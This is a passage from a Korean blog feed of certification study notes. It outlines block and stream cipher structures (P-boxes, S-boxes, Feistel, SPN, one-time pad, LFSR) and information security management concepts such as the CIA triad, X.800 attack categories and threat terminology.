              &lt;li&gt;대칭키 암호 : 뒤죽박죽 섞음 &amp;gt; 스크램블드 에그와 유사&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
          &lt;li&gt;P-Box
            &lt;ul&gt;
              &lt;li&gt;문자 단위로 암호화를 수행했던 고전 전치 암호를 병렬적으로 수행&lt;/li&gt;
              &lt;li&gt;단순(straight), 확장(extension), 축소(compression) P-박스로 세 가지 종류가 있음.
                &lt;ul&gt;
                  &lt;li&gt;축소 P-박스
                    &lt;ul&gt;
                      &lt;li&gt;n 비트를 입력받아 m비트를 출력, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;n&amp;gt;m&lt;/code&gt;을 만족&lt;/li&gt;
                      &lt;li&gt;입력 중에 특정 비트는 소실&lt;/li&gt;
                      &lt;li&gt;1, 2, 3, 4, 5 (5종)입력 -&amp;gt; 1, 2, 3 (3종)출력&lt;/li&gt;
                    &lt;/ul&gt;
                  &lt;/li&gt;
                  &lt;li&gt;확장 P-박스
                    &lt;ul&gt;
                      &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;n&amp;lt;m&lt;/code&gt;을 만족.&lt;/li&gt;
                      &lt;li&gt;입력 비트 중 특정 비트는 한 개 이상의 출력비트와 연결.&lt;/li&gt;
                      &lt;li&gt;비트를 치환하고 동시에 다음 단게에서 비트의 양을 증가시키고자 할 때 사용&lt;/li&gt;
                      &lt;li&gt;1, 2, 3 (3종)입력 -&amp;gt; 1, 2, 3, 4, 5 (5종)출력&lt;/li&gt;
                    &lt;/ul&gt;
                  &lt;/li&gt;
                  &lt;li&gt;역함수의 존재성 : 단순 P-박스는 역함수가 존재하지만 나머지는 존재하지 않는다.&lt;/li&gt;
                &lt;/ul&gt;
              &lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
          &lt;li&gt;S-Box
            &lt;ul&gt;
              &lt;li&gt;치환 암호의 축소 모형. S-박스는 입력과 출력의 개수가 달라도 된다.&lt;/li&gt;
              &lt;li&gt;역함수의 존재성 : 입출력 관계가 테이블 혹은 수학적 관계로 정의되는 암호임. 존재할 수도 있고 없을 수도 있다. 역함수가 존재하면 입출력 비트 개수가 동일하다.&lt;/li&gt;
              &lt;li&gt;Substitution, Swap, Split, Shift, Combine, Exclusive-OR 이용&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
          &lt;li&gt;합성 암호(product Ciphers)
            &lt;ul&gt;
              &lt;li&gt;개요
                &lt;ul&gt;
                  &lt;li&gt;Shannon이 소개&lt;/li&gt;
                  &lt;li&gt;치환, 전치, 그리고 기타의 구성요소를 결합한 복합적인 암호&lt;/li&gt;
                &lt;/ul&gt;
              &lt;/li&gt;
              &lt;li&gt;확산(Diffusion) 과 혼돈(Confusion)
                &lt;ul&gt;
                  &lt;li&gt;설계된 블록 암호가 확산과 혼돈 두 가지 중요한 성질을 갖도록 하는 것&lt;/li&gt;
                  &lt;li&gt;확산 : 암호문과 평문 사이의 관계를 숨기는 것&lt;/li&gt;
                  &lt;li&gt;혼돈 : 암호문과 키의 관계를 숨기는 것
                    &lt;ul&gt;
                      &lt;li&gt;키의 단일비트가 변화하면 암호문의 모든 비트가 변화함&lt;/li&gt;
                    &lt;/ul&gt;
                  &lt;/li&gt;
                &lt;/ul&gt;
              &lt;/li&gt;
              &lt;li&gt;라운드(Rounds)
                &lt;ul&gt;
                  &lt;li&gt;확산과 혼돈은 각 반복이 S-박스, P-박스 그리고 기타 구성 요소들의 결합을 의미하는 반복적 합성 암호를 사용하여 얻어짐&lt;/li&gt;
                  &lt;li&gt;반복적으로 사용되는 합성 암호를 라운드(round) 라고 칭함&lt;/li&gt;
                &lt;/ul&gt;
              &lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
          &lt;li&gt;합성 암호의 종류
            &lt;ul&gt;
              &lt;li&gt;Feistel 암호
                &lt;ul&gt;
                  &lt;li&gt;DES를 포함해서 대부분의 대칭 블록 암호 알고리즘은 1973년 IBM 의 Horst Feistel 이 최초로 소개한 구조를 따라 만들어짐&lt;/li&gt;
                &lt;/ul&gt;
              &lt;/li&gt;
              &lt;li&gt;Feistel 암호 특징
                &lt;ul&gt;
                  &lt;li&gt;페이스텔 구조에서 네트워크라는 이름은 그 구성도가 그물을 짜는 것과 같이 교환되는 형태로 구성되어 있기 때문에 붙여짐&lt;/li&gt;
                  &lt;li&gt;원하는 만큼 라운드 수를 늘릴 수 있음. 라운드 수를 아무리 늘려도 복호화할 수 없게 될 염려가 없음&lt;/li&gt;
                  &lt;li&gt;암호화/복호화 알고리즘을 따로 구현할 필요가 없음&lt;/li&gt;
                &lt;/ul&gt;
              &lt;/li&gt;
              &lt;li&gt;Feistel 암호 예시
                &lt;ul&gt;
                  &lt;li&gt;
                    &lt;table&gt;
                      &lt;tbody&gt;
                        &lt;tr&gt;
                          &lt;td&gt;64비트 평문을 32비트 2개 (L1&lt;/td&gt;
                          &lt;td&gt;R1) 로 쪼갬&lt;/td&gt;
                        &lt;/tr&gt;
                      &lt;/tbody&gt;
                    &lt;/table&gt;
                  &lt;/li&gt;
                  &lt;li&gt;Round1
                    &lt;ul&gt;
                      &lt;li&gt;Mixer 과정
                        &lt;ul&gt;
                          &lt;li&gt;R1 을 F(Round 함수)를 거쳐 결과값을 구함
                            &lt;ul&gt;
                              &lt;li&gt;Key 사용 (K1 : Round 마다 값이 틀림)&lt;/li&gt;
                            &lt;/ul&gt;
                          &lt;/li&gt;
                          &lt;li&gt;L1 과 결과값을 XOR&lt;/li&gt;
                        &lt;/ul&gt;
                      &lt;/li&gt;
                      &lt;li&gt;Swaper 과정
                        &lt;ul&gt;
                          &lt;li&gt;위 결과를 새로운 R2로 함&lt;/li&gt;
                          &lt;li&gt;과정을 거치지 않은 R1을 L2로 함&lt;/li&gt;
                        &lt;/ul&gt;
                      &lt;/li&gt;
                    &lt;/ul&gt;
                  &lt;/li&gt;
                  &lt;li&gt;Round2…&lt;/li&gt;
                  &lt;li&gt;(라운드가 3라운드 이상일 것)&lt;/li&gt;
                  &lt;li&gt;(짝수 라운드 구성)&lt;/li&gt;
                  &lt;li&gt;(역변환이 가능할 것 -&amp;gt; 별도의 복호화 과정이 필요 없음)&lt;/li&gt;
                  &lt;li&gt;(속도가 빠름)&lt;/li&gt;
                &lt;/ul&gt;
              &lt;/li&gt;
              &lt;li&gt;대칭 블록 암호 구현
                &lt;ul&gt;
                  &lt;li&gt;블록 크기(Block Size)
                    &lt;ul&gt;
                      &lt;li&gt;블록 길이가 크다는 것은 더 강한 보안을 의미하지만 암/복호화 속도는 떨어짐&lt;/li&gt;
                      &lt;li&gt;128비트의 블록 크기는 이를 조화시키는 합리적인 크기임&lt;/li&gt;
                    &lt;/ul&gt;
                  &lt;/li&gt;
                  &lt;li&gt;키 길이(Key Size)
                    &lt;ul&gt;
                      &lt;li&gt;키 길이가 길다는 것은 더 강한 보안을 의미하지만 속도가 떨어짐&lt;/li&gt;
                      &lt;li&gt;보통 128비트의 길이를 사용&lt;/li&gt;
                    &lt;/ul&gt;
                  &lt;/li&gt;
                  &lt;li&gt;라운드 수(Number of rounds)
                    &lt;ul&gt;
                      &lt;li&gt;라운드 수를 증가하면 보안을 강화할 수 있다. 페이스텔 암호의 핵심&lt;/li&gt;
                      &lt;li&gt;보통 16 라운드&lt;/li&gt;
                    &lt;/ul&gt;
                  &lt;/li&gt;
                  &lt;li&gt;서브키 생성 알고리즘(Subkey generation algorithm)
                    &lt;ul&gt;
                      &lt;li&gt;이 알고리즘이 복잡하면 복잡할수록 암호해독이 어려워짐&lt;/li&gt;
                    &lt;/ul&gt;
                  &lt;/li&gt;
                  &lt;li&gt;라운드 함수(round function)
                    &lt;ul&gt;
                      &lt;li&gt;이 알고리즘이 복잡하면 복잡할수록 암호해독이 어려워짐&lt;/li&gt;
                    &lt;/ul&gt;
                  &lt;/li&gt;
                &lt;/ul&gt;
              &lt;/li&gt;
              &lt;li&gt;SPN (Substitution Permutation Network)
                &lt;ul&gt;
                  &lt;li&gt;S-Box : 치환 암호의 축소형
                    &lt;ul&gt;
                      &lt;li&gt;64bit =&amp;gt; 16bit * 4 (4행 16열)&lt;/li&gt;
                      &lt;li&gt;6개의 입력값을 받아 4개의 출력값을 출력&lt;/li&gt;
                      &lt;li&gt;3행 6열의 값 1&lt;/li&gt;
                      &lt;li&gt;b1, b6 = 행&lt;/li&gt;
                      &lt;li&gt;b2, b3, b4, b5 = 열&lt;/li&gt;
                      &lt;li&gt;3행 6열 : 101101&lt;/li&gt;
                      &lt;li&gt;값 1 : 0001&lt;/li&gt;
                    &lt;/ul&gt;
                  &lt;/li&gt;
                  &lt;li&gt;SPN 암호 예시
                    &lt;ul&gt;
                      &lt;li&gt;Plain Text 를 Key0 와 XOR 수행&lt;/li&gt;
                      &lt;li&gt;S1, S2, S3, S4&lt;/li&gt;
                      &lt;li&gt;P box (S1, S2, S3, S4 결과 내 각각을 자리이동)&lt;/li&gt;
                      &lt;li&gt;위 결과를 Key1 와 XOR 수행&lt;/li&gt;
                      &lt;li&gt;…&lt;/li&gt;
                    &lt;/ul&gt;
                  &lt;/li&gt;
                &lt;/ul&gt;
              &lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;현대 스트림 암호
        &lt;ul&gt;
          &lt;li&gt;개요
            &lt;ul&gt;
              &lt;li&gt;현대 스트림 암호에서 암호화와 복호화는 한 번에 비트를 생성함&lt;/li&gt;
              &lt;li&gt;스트림 암호는 블록 암호보다 빠름&lt;/li&gt;
              &lt;li&gt;하드웨어 구현 또한 블록 암호보다 용이&lt;/li&gt;
              &lt;li&gt;키 스트림을 어떻게 생성하는지가 주 관심사&lt;/li&gt;
              &lt;li&gt;동기식과 비동기식&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
          &lt;li&gt;예시
            &lt;ul&gt;
              &lt;li&gt;P =&amp;gt; Pn, Pn-1 … P2, P1&lt;/li&gt;
              &lt;li&gt;K =&amp;gt; Kn, Kn-1 … K2, K1
                &lt;ul&gt;
                  &lt;li&gt;의사난수 생성기 이용-PRNG / 언젠가 반복되나 난수의 효과&lt;/li&gt;
                  &lt;li&gt;보통 128bit&lt;/li&gt;
                &lt;/ul&gt;
              &lt;/li&gt;
              &lt;li&gt;C =&amp;gt; Cn, Cn-1 … C2, C1&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
          &lt;li&gt;동기식 스트림 암호
            &lt;ul&gt;
              &lt;li&gt;개요
                &lt;ul&gt;
                  &lt;li&gt;동기식 스트림 암호에서 키 스트림은 평문 혹은 암호문 스트림과 독립적
                    &lt;ul&gt;
                      &lt;li&gt;비동기식 스트림암호:이전 평문이나 암호문에 종속적 (자기동기식)&lt;/li&gt;
                    &lt;/ul&gt;
                  &lt;/li&gt;
                  &lt;li&gt;키 스트림은 평문 혹은 암호문 비트와 키 비트 사이에 어떠한 관계도 없이 생성&lt;/li&gt;
                &lt;/ul&gt;
              &lt;/li&gt;
              &lt;li&gt;One-Time Pad
                &lt;ul&gt;
                  &lt;li&gt;동기식 스트림 암호중에서 가장 간단하고 안전한 암호&lt;/li&gt;
                  &lt;li&gt;Gilbert Vernam에 의해 설계됨&lt;/li&gt;
                  &lt;li&gt;암호화를 수행할 때마다 랜덤하게 선택된 키스트림을 사용&lt;/li&gt;
                  &lt;li&gt;해독 불가능하다는 것이 증명됨&lt;/li&gt;
                  &lt;li&gt;암호화/복호화 알고리즘은 각각 배타적 논리합 연산을 사용&lt;/li&gt;
                  &lt;li&gt;한번에 한 비트씩 사용&lt;/li&gt;
                &lt;/ul&gt;
              &lt;/li&gt;
              &lt;li&gt;귀환 쉬프트 레지스터 (Feedback Shift Register)
                &lt;ul&gt;
                  &lt;li&gt;One-Time Pad 의 절충안&lt;/li&gt;
                  &lt;li&gt;FSR은 소프트웨어, 하드웨어 환경에서 모두 구현될 수 있지만 하드웨어가 좀 더 용이&lt;/li&gt;
                  &lt;li&gt;쉬프트 레지스터와 귀환 함수로 구성&lt;/li&gt;
                &lt;/ul&gt;
              &lt;/li&gt;
              &lt;li&gt;선형 귀환 쉬프트 레지스터 (LFSR, Linear Feedback Shift Register)&lt;/li&gt;
              &lt;li&gt;비선형 귀환 쉬프트 레지스터 (NLFSR, NonLinear Feedback Shift Register)
                &lt;ul&gt;
                  &lt;li&gt;LFSR은 선형성으로 공격에 취약, 따라서 더 안전한 스트림 암호 설계를 위해 사용&lt;/li&gt;
                  &lt;li&gt;비선형으로 설계되는 것 외에는 LSFR 와 동일&lt;/li&gt;
                &lt;/ul&gt;
              &lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
          &lt;li&gt;비동기식 스트림 암호
            &lt;ul&gt;
              &lt;li&gt;키 스트림의 각 비트는 이전의 평문이나 암호문에 종속적으로 결정&lt;/li&gt;
              &lt;li&gt;블록 암호에서 다른 운영 모드를 생성하기 위해 사용되는 한 가지 방법인 CFB모드 (Cipher Feedback Mode) 는 실제로 스트림 암호를 생성함&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;</content><author><name>HY03</name><email>hyunik03@gmail.com</email></author><category term="IS_Certification" /><category term="정보보안기사" /><category term="블록 암호" /><category term="스트림 암호" /><summary type="html">대칭키 암호 대칭키 암호 = 공통키 암호 비대칭키 암호 = 공개키 암호</summary></entry><entry><title type="html">정보보안 - 정보보호관리</title><link href="https://bluesplatter.com/is_certification/IS-Management-Outline/" rel="alternate" type="text/html" title="정보보안 - 정보보호관리" /><published>2021-07-13T09:00:00+09:00</published><updated>2021-07-13T09:00:00+09:00</updated><id>https://bluesplatter.com/is_certification/IS-Management-Outline</id><content type="html" xml:base="https://bluesplatter.com/is_certification/IS-Management-Outline/">&lt;h1 id=&quot;정보보호-개요&quot;&gt;정보보호 개요&lt;/h1&gt;
&lt;ul&gt;
  &lt;li&gt;정보화 사회
    &lt;ul&gt;
      &lt;li&gt;정보화 사회 : 단일 생활권
        &lt;ul&gt;
          &lt;li&gt;사회 모습 변화&lt;/li&gt;
          &lt;li&gt;전자 메일, 인터넷으로 정보 교환, 재택근무, 홈뱅킹&lt;/li&gt;
          &lt;li&gt;미래 사이버 전쟁&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;정보화 역기능
        &lt;ul&gt;
          &lt;li&gt;사회 문제 뿐만 아니라 국가 안위에까지 위협&lt;/li&gt;
          &lt;li&gt;프라이버시 침해, 해커와 바이러스 기승, 컴퓨터 범죄 등&lt;/li&gt;
          &lt;li&gt;스마트폰 사용으로 정보보호가 더 중요해짐&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;사이버환경의 특징
        &lt;ul&gt;
          &lt;li&gt;비대면성, 익명성, 시간 및 공간적 운영의 무제한성, 무제한적인 정보 및 신속한 전송, 미래의 범죄 및 전쟁 공간&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;정보보호
    &lt;ul&gt;
      &lt;li&gt;정의
        &lt;ul&gt;
          &lt;li&gt;정보의 수집, 가공, 저장, 검색, 송신, 수신 중에 발생하는 정보의 훼손, 변조, 유출 등을 방지하기 위한 관리적, 기술적 수단 또는 그러한 수단으로 이루어지는 행위&lt;/li&gt;
          &lt;li&gt;기밀성, 무결성, 가용성, 인증성 및 부인방지를 보장하기 위하여 기술적/물리적/관리적 보호대책을 강구하는 것&lt;/li&gt;
          &lt;li&gt;정보보호 관리, 컴퓨터 및 데이터 보안, 네트워크 보안과 정보보호 정책&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;정보의 가용성과 안정성 (보안성)
        &lt;ul&gt;
          &lt;li&gt;정보보호는 정보의 활용과 정보의 통제 사이에서 균형감각을 갖는 행위&lt;/li&gt;
          &lt;li&gt;사용 가능한 자원을 쉽게 얻을 수 있으면서도 정보에 위협이 되는 요소들을 최소화&lt;/li&gt;
          &lt;li&gt;정보의 활용 : 가용성의 극대화&lt;/li&gt;
          &lt;li&gt;정보의 통제 : 안정성을 확보하기 위해 최대한 통제&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;정보보호의 목표
        &lt;ul&gt;
          &lt;li&gt;기밀성
            &lt;ul&gt;
              &lt;li&gt;오직 인가된 사람, 인가된 프로세스, 시스템만이 알 필요성에 근거&lt;/li&gt;
              &lt;li&gt;데이터 기밀성 : 개인정보나 기밀정보를 부정한 사용자가 이용하거나 그들에게 노출되지 않도록 하는 것&lt;/li&gt;
              &lt;li&gt;프라이버시 : 개인과 관련된 어떤 정보가 수집되고 저장되는지, 누구에게 그 정보가 공개되는지, 누가 공개하는지 등을 통제하거나 영향이 미칠수 있도록 하는 것&lt;/li&gt;
              &lt;li&gt;접근제어, 암호화 등&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
          &lt;li&gt;무결성
            &lt;ul&gt;
              &lt;li&gt;네트워크를 통하여 송수신되는 정보의 내용이 불법적으로 생성, 변경, 삭제되지 않도록 보호&lt;/li&gt;
              &lt;li&gt;전력차단과 같은 시스템 중단이 정보에 예상치 못한 변형을 일으킬 수 있음&lt;/li&gt;
              &lt;li&gt;접근제어, 메시지 인증, 침입 탐지, 백업&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
          &lt;li&gt;가용성
            &lt;ul&gt;
              &lt;li&gt;시스템이 지체없이 동작하도록 하고, 합법적 사용자가 서비스 사용을 거절당하지 않도록 하는 것&lt;/li&gt;
              &lt;li&gt;정보는 지속적으로 변화, 인가된 자가 접근할 수 있어야 함.&lt;/li&gt;
              &lt;li&gt;데이터 백업, 중복성 유지, 물리적 위협요소로부터의 보호&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
          &lt;li&gt;인증성
            &lt;ul&gt;
              &lt;li&gt;실체, 신뢰할 수 있는 데이터인지 확인&lt;/li&gt;
              &lt;li&gt;전송 메시지나 메시지 출처에 대한 유효성, 신뢰성&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
          &lt;li&gt;책임추적성
            &lt;ul&gt;
              &lt;li&gt;부인방지 (부인봉쇄), 억제, 결함분리, 침입탐지 예방, 법적인 조치&lt;/li&gt;
              &lt;li&gt;포렌식&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;정보보호 관리
    &lt;ul&gt;
      &lt;li&gt;정보보호 관리의 개념
        &lt;ul&gt;
          &lt;li&gt;정보는 기업이나 공공기관의 중요한 자산&lt;/li&gt;
          &lt;li&gt;비인가자에게 노출되지 않도록 관리해야 함
            &lt;ul&gt;
              &lt;li&gt;기업이나 조직의 목적을 충족시키면서 위험 수위를 낮추는 것&lt;/li&gt;
              &lt;li&gt;위험은 제거 대상이 아닌 관리(감소) 대상임
                &lt;ul&gt;
                  &lt;li&gt;최고 경영자의 지원과 관심 필요&lt;/li&gt;
                &lt;/ul&gt;
              &lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
          &lt;li&gt;정보보호 관리시스템
            &lt;ul&gt;
              &lt;li&gt;ISMS : 정보보호 관리체계&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;정보보호 관리와 정보보호 대책
        &lt;ul&gt;
          &lt;li&gt;&amp;lt;    &amp;lt;    &lt;기술적 보호대책=&quot;&quot;&gt; 물리적 보호대책&amp;gt; 관리적 보호대책&amp;gt;&lt;/기술적&gt;&lt;/li&gt;
          &lt;li&gt;기술적 보호대책
            &lt;ul&gt;
              &lt;li&gt;정보 시스템, 통신망, 정보를 보호하기 위한 가장 기본적인 대책&lt;/li&gt;
              &lt;li&gt;접근통제, 암호기술, 백업체계, 정보시스템 자체에 보안성이 강화된 시스템 소프트웨어 사용 등&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
          &lt;li&gt;물리적 보호대책
            &lt;ul&gt;
              &lt;li&gt;자연재해로부터 정보시스템이 위치한 정보처리시설을 보호하기 위한 재해대책&lt;/li&gt;
              &lt;li&gt;불순 세력이나 적의 파괴로부터 출입통제, 시건장치 등&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
          &lt;li&gt;관리적 보호대책
            &lt;ul&gt;
              &lt;li&gt;법, 제도, 규정, 교육 등을 확립, 보안 계획을 수립하고 이를 운영&lt;/li&gt;
              &lt;li&gt;위험 분석 및 보안감사 시행&lt;/li&gt;
              &lt;li&gt;기술적 보호대책을 계획, 설계, 제도/정책/절차 생성&lt;/li&gt;
              &lt;li&gt;내부자의 부당행위 방지 교육&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;정보보호 관리
        &lt;ul&gt;
          &lt;li&gt;정보보호 관리는 기업과 조직의 비즈니스 목적을 충족시키면서 수용가능한 수준으로 위험을 낮추는 것&lt;/li&gt;
          &lt;li&gt;위험은 제거 대상이 아닌 관리 대상&lt;/li&gt;
          &lt;li&gt;위험은 식별되거나 감소될 수 있지만 제거될 수 없음&lt;/li&gt;
          &lt;li&gt;정보보호 관리를 위해서는 최고 경영진의 지원과 관심이 필요&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;OSI 보안 구조
    &lt;ul&gt;
      &lt;li&gt;개요
        &lt;ul&gt;
          &lt;li&gt;기본개념
            &lt;ul&gt;
              &lt;li&gt;ITU-T (국제 전기통신 연합 - 전기통신표준화 부문) X.800
                &lt;ul&gt;
                  &lt;li&gt;관리자가 효과적으로 보안문제를 조직화 할 수 있는 유용한 방법&lt;/li&gt;
                &lt;/ul&gt;
              &lt;/li&gt;
              &lt;li&gt;보안공격 : 기관이 소유한 정보의 안정성을 침해하는 제반 행위&lt;/li&gt;
              &lt;li&gt;보안 매커니즘 : 보안공격을 탐지, 예방하거나 침해를 복구하는 절차&lt;/li&gt;
              &lt;li&gt;보안 서비스 : 조직의 보안을 강화하기 위한 처리 또는 통신 서비스, 보안 공격에 대응, 하나 이상의 보안 메커니즘을 사용&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
          &lt;li&gt;보안 공격
            &lt;ul&gt;
              &lt;li&gt;보안의 세 가지 목표 (기밀성,무결성,가용성) 은 보안공격에 위협을 받을 수 있음
                &lt;ul&gt;
                  &lt;li&gt;기밀성을 위협하는 공격
                    &lt;ul&gt;
                      &lt;li&gt;스누핑 (Snooping) : 데이터에 대한 비인가 접근 또는 탈취&lt;/li&gt;
                      &lt;li&gt;트래픽 분석 (Traffic Analysis) : 암호화 되어 있을지라도 온라인 트래픽을 분석해 다른 형태의 정보를 얻을 수 있음&lt;/li&gt;
                    &lt;/ul&gt;
                  &lt;/li&gt;
                  &lt;li&gt;무결성을 위협하는 공격
                    &lt;ul&gt;
                      &lt;li&gt;변경 (메시지 수정, Modification) : 적법한 메시지의 일부를 불법으로 수정하거나 메시지 전송 순서를 바꾸는 것&lt;/li&gt;
                      &lt;li&gt;가장 (Masquerading) : 신분위장은 한 개체가 다른 개체의 행세를 하는 것&lt;/li&gt;
                      &lt;li&gt;재연 (재전송, Replaying) : 적극적 공격의 하나로 획득한 데이터 단위를 보관하고 있다가 시간이 경과한 후에 재전송함으로써 인가되지 않은 사항에 접근하는 효과를 노리는 행위&lt;/li&gt;
                      &lt;li&gt;부인 (Repudiation) : 메시지의 송신이나 수신을 부인&lt;/li&gt;
                    &lt;/ul&gt;
                  &lt;/li&gt;
                  &lt;li&gt;가용성을 위협하는 공격
                    &lt;ul&gt;
                      &lt;li&gt;서비스 거부 (Denial of Service) : 매우 일방적인 공격. 시스템의 서비스를 느리게 하거나 완전히 차단&lt;/li&gt;
                      &lt;li&gt;물리적 공격&lt;/li&gt;
                    &lt;/ul&gt;
                  &lt;/li&gt;
                &lt;/ul&gt;
              &lt;/li&gt;
              &lt;li&gt;소극적 공격과 적극적 공격
                &lt;ul&gt;
                  &lt;li&gt;소극적 공격 : 정보를 획득하거나 사용하려는 시도, 시스템 자원에는 영향을 끼치지 않음
                    &lt;ul&gt;
                      &lt;li&gt;Snooping
                        &lt;ul&gt;
                          &lt;li&gt;Snooping : 도청 + 탈취&lt;/li&gt;
                          &lt;li&gt;Snipping : 도청&lt;/li&gt;
                        &lt;/ul&gt;
                      &lt;/li&gt;
                      &lt;li&gt;Traffic Analysis&lt;/li&gt;
                      &lt;li&gt;공격자의 목표는 정보 획득&lt;/li&gt;
                    &lt;/ul&gt;
                  &lt;/li&gt;
                  &lt;li&gt;적극적 공격 : 시스템 자원을 변경하거나 시스템 작동에 영향을 끼치는 공격 형태
                    &lt;ul&gt;
                      &lt;li&gt;변조, 가장, 재연, 부인&lt;/li&gt;
                      &lt;li&gt;DoS, 물리적 공격&lt;/li&gt;
                      &lt;li&gt;무결성과 가용성을 위협&lt;/li&gt;
                      &lt;li&gt;공격자가 다양한 방법을 사용 : 방어보다 탐지가 더 쉬움&lt;/li&gt;
                    &lt;/ul&gt;
                  &lt;/li&gt;
                &lt;/ul&gt;
              &lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
          &lt;li&gt;보안 서비스
            &lt;ul&gt;
              &lt;li&gt;보안 정책을 구현하고 보안 메커니즘에 의해 구현되는 것&lt;/li&gt;
              &lt;li&gt;서비스 종류
                &lt;ul&gt;
                  &lt;li&gt;기밀성 / 무결성 / 가용성&lt;/li&gt;
                  &lt;li&gt;인증&lt;/li&gt;
                  &lt;li&gt;부인방지&lt;/li&gt;
                  &lt;li&gt;접근제어&lt;/li&gt;
                &lt;/ul&gt;
              &lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;기본 보안용어 정의
    &lt;ul&gt;
      &lt;li&gt;자산 (Asset)
        &lt;ul&gt;
          &lt;li&gt;조직이 보호해야 할 대상, 데이터 혹은 자산 소유자가 가치를 부여한 실체&lt;/li&gt;
          &lt;li&gt;하드웨어 : 컴퓨터 시스템, 데이터 처리/저장/통신 장비&lt;/li&gt;
          &lt;li&gt;소프트웨어 : 운영체제, 시스템 도구, 어플리케이션&lt;/li&gt;
          &lt;li&gt;데이터 : 파일, 데이터베이스, 암호파일과 같은 보안 관련 데이터&lt;/li&gt;
          &lt;li&gt;통신 설비와 네트워크 : 지역과 광역 네트워크 통신 연결, 브리지, 라우터 등&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;취약점 (Vulnerability)
        &lt;ul&gt;
          &lt;li&gt;위협의 이용대상으로 관리적, 물리적, 기술적 약점 (정보보호 대책 미비)&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;위협 (Threat)
        &lt;ul&gt;
          &lt;li&gt;손실이나 손상의 원인이 될 가능성을 제공하는 환경의 집합
            &lt;ul&gt;
              &lt;li&gt;자연재해&lt;/li&gt;
              &lt;li&gt;인간에 의한 의도적 위협 : 해커, 바이러스, 도청 등&lt;/li&gt;
              &lt;li&gt;인간에 의한 비의도적 위협 : 실수, 태만&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
          &lt;li&gt;보안에 해를 끼치는 행동이나 사건&lt;/li&gt;
          &lt;li&gt;가로채기 (interception)
            &lt;ul&gt;
              &lt;li&gt;비인가된 당사자가 자산으로의 접근을 획득한 것을 의미&lt;/li&gt;
              &lt;li&gt;불법 복사, 도청 등&lt;/li&gt;
              &lt;li&gt;기밀성에 영향&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
          &lt;li&gt;가로막음 (interruption)
            &lt;ul&gt;
              &lt;li&gt;시스템 자산이 손실되거나 사용 불가능하게 됨&lt;/li&gt;
              &lt;li&gt;하드웨어 장치의 악의적 파괴, 파일 삭제, 서비스 거부 등&lt;/li&gt;
              &lt;li&gt;가용성에 영향&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
          &lt;li&gt;변조 (modification)
            &lt;ul&gt;
              &lt;li&gt;비인가된 당사자가 접근하여 그 내용을 변경&lt;/li&gt;
              &lt;li&gt;데이터베이스 값 변경, 특정 프로그램 변경&lt;/li&gt;
              &lt;li&gt;무결성에 영향&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
          &lt;li&gt;위조 (fabrication)
            &lt;ul&gt;
              &lt;li&gt;비인가된 당사자가 컴퓨터 시스템 상 불법 객체의 위조 정보를 생성&lt;/li&gt;
              &lt;li&gt;네트워크 통신에 가짜 거래 정보를 생성&lt;/li&gt;
              &lt;li&gt;무결성에 영향&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;위협원 (Threat agents)
        &lt;ul&gt;
          &lt;li&gt;정보자산에 해를 끼치는 행동을 할 수 있는 실체&lt;/li&gt;
          &lt;li&gt;해커, 일반 사용자, 컴퓨터 프로세스, 재난 등&lt;/li&gt;
          &lt;li&gt;취약점을 이용하는 존재&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;위험 (Risk)
        &lt;ul&gt;
